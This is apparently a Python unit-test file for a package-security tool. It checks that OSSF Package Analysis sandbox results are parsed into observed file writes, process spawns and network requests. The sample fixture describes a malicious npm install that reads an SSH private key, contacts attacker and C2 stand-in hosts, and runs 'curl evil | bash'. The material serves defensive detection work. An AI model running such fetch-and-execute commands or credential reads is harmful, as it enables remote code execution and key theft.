"""OSSF Package Analysis fetcher + parser + sandbox 단위 테스트.

실 네트워크 X — fetch_ossf_analysis 만 monkeypatch.
"""
from __future__ import annotations

import io
import json
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from pkgsentinel.knowledge import ossf_package_analysis as opa
from pkgsentinel.schema import Ecosystem
from pkgsentinel.stages.stage_sandbox import BaseSandbox


# ─────────────── 파서 ───────────────

_SAMPLE_RESULT = {
    "Package": {"Name": "evil", "Version": "0.0.1", "Ecosystem": "npm"},
    "Analysis": {
        "install": {
            "Files": [
                {"Path": "/root/.ssh/id_rsa", "Read": True, "Write": False},
                {"Path": "/tmp/payload.sh", "Write": True},
                {"Path": "/usr/lib/python/os.py", "Read": True},  # 의심 X — skip
            ],
            "Sockets": [
                {"Address": "185.143.223.5", "Port": 443,
                 "Hostnames": ["attacker.example.com"]},
                {"Address": "127.0.0.1", "Port": 80, "Hostnames": []},
            ],
            "Commands": [
                {"Command": ["sh", "-c", "curl evil | bash"],
                 "Environment": ["PATH=/usr/bin"]},
                {"Command": ["whoami"]},
            ],
            "DNS": [
                {"Hostname": "extra-c2.example.net"},
            ],
        },
    },
}


def test_parse_files_write_recorded():
    print("== Files.Write → file_writes ==")
    obs = opa.parse_ossf_to_observed(_SAMPLE_RESULT)
    assert any("payload.sh" in x for x in obs.file_writes)
    print(f"  OK file_writes={obs.file_writes}")


def test_parse_sensitive_read_recorded():
    """write/delete 아니더라도 .ssh / .aws 같은 민감 경로 read 는 기록."""
    print("\n== sensitive Read → file_writes label ==")
    obs = opa.parse_ossf_to_observed(_SAMPLE_RESULT)
    assert any("id_rsa" in x or "read sensitive" in x for x in obs.file_writes)
    # 일반 라이브러리 파일 read 는 무시
    assert not any("os.py" in x for x in obs.file_writes)
    print("  OK")


def test_parse_commands():
    print("\n== Commands → process_spawns ==")
    obs = opa.parse_ossf_to_observed(_SAMPLE_RESULT)
    assert any("curl evil" in x for x in obs.process_spawns)
    assert any("whoami" in x for x in obs.process_spawns)
    print(f"  OK spawns={obs.process_spawns}")


def test_parse_sockets_with_hostname():
    print("\n== Sockets + Hostnames → network_requests ==")
    obs = opa.parse_ossf_to_observed(_SAMPLE_RESULT)
    # hostname 우선 표기
    assert any("attacker.example.com" in x for x in obs.network_requests)
    # hostname 없는 raw IP 도 기록
    assert any("127.0.0.1" in x for x in obs.network_requests)
    print(f"  OK net={obs.network_requests}")


def test_parse_dns():
    print("\n== DNS-only → network_requests ==")
    obs = opa.parse_ossf_to_observed(_SAMPLE_RESULT)
    assert any("extra-c2.example.net" in x for x in obs.network_requests)
    print("  OK")


def test_parse_mode_metadata():
    print("\n== mode = 'ossf-package-analysis' ==")
    obs = opa.parse_ossf_to_observed(_SAMPLE_RESULT, duration_s=1.5)
    assert obs.mode == "ossf-package-analysis"
    assert obs.duration_s == 1.5
    assert obs.has_findings
    print("  OK")


def test_parse_empty_result_no_findings():
    print("\n== 빈 결과 → no findings ==")
    obs = opa.parse_ossf_to_observed({"Analysis": {"install": {}}})
    assert not obs.has_findings
    print("  OK")


# ─────────────── Fetcher (mock HTTP) ───────────────

def _make_urlopen(payload: dict, status: int = 200):
    body = json.dumps(payload).encode("utf-8")

    class _Resp:
        def __init__(self): self.status = status
        def read(self): return body
        def __enter__(self): return self
        def __exit__(self, *a): return False

    def _urlopen(req, timeout=None):
        if status == 404:
            import urllib.error
            raise urllib.error.HTTPError(
                req.full_url, 404, "not found",
                req.header_items(), io.BytesIO(body),
            )
        return _Resp()
    return _urlopen


def test_fetch_404_returns_none(monkeypatch):
    """OSSF 가 아직 분석 안 한 패키지 → None (graceful)."""
    print("\n== fetch 404 → None ==")
    opa._FETCH_CACHE.clear()
    monkeypatch.setattr("urllib.request.urlopen", _make_urlopen({}, status=404))
    r = opa.fetch_ossf_analysis("never-analyzed", Ecosystem.NPM, "1.0")
    assert r is None
    print("  OK")


def test_fetch_caches_404(monkeypatch):
    """404 도 cache → 동일 패키지 두 번째 호출은 네트워크 안 부름."""
    print("\n== 404 cached ==")
    opa._FETCH_CACHE.clear()
    call_count = [0]
    def _urlopen(req, timeout=None):
        call_count[0] += 1
        import urllib.error
        raise urllib.error.HTTPError(
            req.full_url, 404, "nf", req.header_items(), io.BytesIO(b""),
        )
    monkeypatch.setattr("urllib.request.urlopen", _urlopen)
    opa.fetch_ossf_analysis("x", Ecosystem.NPM, "1.0")
    opa.fetch_ossf_analysis("x", Ecosystem.NPM, "1.0")
    assert call_count[0] == 1, call_count[0]
    print(f"  OK fetched once ({call_count[0]}x)")


def test_fetch_200_success(monkeypatch):
    print("\n== fetch 200 → parsed dict ==")
    opa._FETCH_CACHE.clear()
    monkeypatch.setattr(
        "urllib.request.urlopen", _make_urlopen(_SAMPLE_RESULT),
    )
    r = opa.fetch_ossf_analysis("evil", Ecosystem.NPM, "0.0.1")
    assert r is not None
    assert r["Package"]["Name"] == "evil"
    print("  OK")


# ─────────────── OssfDataSandbox ───────────────

def test_sandbox_run_with_data(monkeypatch):
    print("\n== OssfDataSandbox.run with data ==")
    opa._FETCH_CACHE.clear()
    monkeypatch.setattr(
        opa, "fetch_ossf_analysis",
        lambda pkg, eco, ver, timeout=15: _SAMPLE_RESULT,
    )
    sb = opa.OssfDataSandbox()
    obs = sb.run("evil", Ecosystem.NPM, "0.0.1")
    assert obs.has_findings
    assert obs.mode == "ossf-package-analysis"
    print(f"  OK findings: net={len(obs.network_requests)} "
          f"procs={len(obs.process_spawns)} files={len(obs.file_writes)}")


def test_sandbox_run_without_data(monkeypatch):
    """OSSF 데이터 없으면 error 필드 + has_findings=False."""
    print("\n== OssfDataSandbox.run with no data ==")
    monkeypatch.setattr(
        opa, "fetch_ossf_analysis",
        lambda pkg, eco, ver, timeout=15: None,
    )
    sb = opa.OssfDataSandbox()
    obs = sb.run("never-analyzed", Ecosystem.NPM, "1.0")
    assert not obs.has_findings
    assert "no OSSF" in (obs.error or "")
    print("  OK graceful no-data")


def test_get_default_sandbox_is_ossf():
    """get_default_sandbox 가 OssfDataSandbox 인스턴스 반환."""
    print("\n== get_default_sandbox → OssfDataSandbox ==")
    from pkgsentinel.stages.stage_sandbox import get_default_sandbox
    sb = get_default_sandbox()
    assert isinstance(sb, opa.OssfDataSandbox)
    assert isinstance(sb, BaseSandbox)
    print(f"  OK type={type(sb).__name__}")


def main():
    pass


if __name__ == "__main__":
    main()
